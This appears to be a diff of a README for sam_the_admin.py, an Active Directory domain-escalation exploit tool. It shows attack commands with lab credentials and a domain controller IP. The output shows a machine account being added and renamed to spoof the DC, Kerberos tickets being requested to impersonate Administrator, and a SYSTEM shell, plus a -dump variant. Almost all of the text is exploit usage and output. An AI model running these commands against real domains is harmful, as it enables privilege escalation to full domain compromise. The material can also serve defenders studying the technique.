@@ -6,22 +6,8 @@ $ python3 sam_the_admin.py "jas502n/hr:Admin@12" -dc-ip 172.16.242.135 -shell
 
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 
-[*] Selected Target dc01.jas502n.com
-[*] Total Domain Admins 1
-[*] will try to impersonat Administrator
-[*] Current ms-DS-MachineAccountQuota = 10
-[*] Adding Computer Account "SAMTHEADMIN-59$"
-[*] MachineAccount "SAMTHEADMIN-59$" password = @L!LeScGKcBA
-[*] Successfully added machine account SAMTHEADMIN-59$ with password @L!LeScGKcBA.
-[*] SAMTHEADMIN-59$ object = CN=SAMTHEADMIN-59,CN=Computers,DC=jas502n,DC=com
-[*] SAMTHEADMIN-59$ sAMAccountName == dc01
-[*] Saving ticket in dc01.ccache
-[*] Resting the machine account to SAMTHEADMIN-59$
-[*] Restored SAMTHEADMIN-59$ sAMAccountName to original value
-[*] Using TGT from cache
-[*] Impersonating Administrator
-[*] 	Requesting S4U2self
-[*] Saving ticket in Administrator.ccache
+..Selected Target dc01.jas502n.com
+..Saving ticket in Administrator.ccache
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 
 [!] Launching semi-interactive shell - Careful what you execute
@@ -30,7 +16,9 @@ nt authority\system
 
 or
 
-$ python3 sam_the_admin.py "jas502n/John:Admin@123" -dc-ip 172.16.242.135 -dump                                                                                                                                         1 ↵
+$ python3 sam_the_admin.py "jas502n/John:Admin@123" -dc-ip 172.16.242.135 -dump   
+
+1 ↵
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 
 [*] Selected Target dc01.jas502n.com
